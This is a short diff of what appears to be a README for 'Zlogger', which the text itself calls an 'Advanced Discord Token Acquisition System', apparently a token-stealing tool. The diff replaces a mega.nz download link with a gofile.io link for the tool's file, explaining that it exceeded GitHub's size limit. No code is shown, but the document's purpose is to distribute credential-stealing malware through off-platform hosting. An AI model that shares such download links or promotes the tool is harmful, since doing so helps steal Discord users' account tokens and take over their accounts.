@@ -1,5 +1,5 @@
 
-Note: we had to use mega.nz since the file was a bit bigger than the github limit, so here: https://mega.nz/file/6y53xKia#H0s2abUKXtv_OrN0Bazj1nwiHr6bRSFS4J2duY0XbCs
+Note: we had to use gofile.io since the file was a bit bigger than the github limit, so here: https://gofile.io/d/ZkLyGU
 
 🚀 Zlogger - Advanced Discord Token Acquisition System 🕵️‍♂️
 
